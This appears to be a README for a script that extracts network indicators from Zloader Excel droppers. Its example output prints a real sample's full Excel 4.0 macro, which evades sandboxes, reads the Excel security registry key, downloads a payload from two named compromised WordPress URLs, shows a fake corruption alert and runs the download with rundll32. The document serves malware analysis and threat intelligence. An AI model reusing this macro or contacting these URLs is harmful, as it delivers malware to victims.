# zloader-extractor
A script to extract network IOCs from Zloader xls droppers

### Prerequisites
#### Requirements

```
$>pip install -r requirements.txt
```


## Usage

One one file:

```
$>python3 zloader_pown.py -f <xls file>
```

Recursively on a directory (every file will be matched against the embedded yara rule):

```
$>python3 zloader_pown.py -d <path to the directory>
```

An optional argument can be set to enable full macro dump on the standard output

```
$>python3 zloader_pown.py --dump-macro -f <xls file>
```


Example:

```
python3 zloader_pown.py --dump-macro -f ad3cf63d5acfba7788b01557eba63e6a2e712aa2c3a0970ffc901f7dead4f943
Extracting macros from ad3cf63d5acfba7788b01557eba63e6a2e712aa2c3a0970ffc901f7dead4f943
=IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)
=IF(GET.WORKSPACE(14)<390,CLOSE(FALSE),)
=IF(GET.WORKSPACE(19),,CLOSE(TRUE))
=IF(GET.WORKSPACE(42),,CLOSE(TRUE))
=IF(ISNUMBER(SEARCH("Windows",GET.WORKSPACE(1))),,CLOSE(TRUE))
="C:\Users\"&GET.WORKSPACE(26)&"\AppData\Local\Temp\"&RANDBETWEEN(1,9999)&".reg"
="EXPORT HKCU\Software\Microsoft\Office\"&GET.WORKSPACE(2)&"\Excel\Security "&R[-1]C&" /y"
=CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\reg.exe",R[-1]C,0,5)
=WAIT(NOW()+"00:00:03")
=FOPEN(R[-4]C)
=FPOS(R[-1]C,215)
=FREAD(R[-2]C,255)
=FCLOSE(R[-3]C)
=FILE.DELETE(R[-8]C)
=IF(ISNUMBER(SEARCH("0001",R[-3]C)),CLOSE(FALSE),)
="C:\Users\"&GET.WORKSPACE(26)&"\AppData\Local\Temp\CVR"&RANDBETWEEN(1000,9999)&".tmp.cvr"
="https://giaytore.com/wp-content/themes/calliope/wp-front.php"
="https://gdchub.com//wp-content/themes/chihua/wp-front.php"
=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,R[-2]C,R[-3]C,0,0)
=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,R[-2]C,R[-4]C,0,0),)
=ALERT("The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt.",2)
=CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\rundll32.exe",R[-6]C&",DllRegisterServer",0,5)
=CLOSE(FALSE)

Payload delivery urls found:
https://giaytore.com/wp-content/themes/calliope/wp-front.php
https://gdchub.com//wp-content/themes/chihua/wp-front.php
```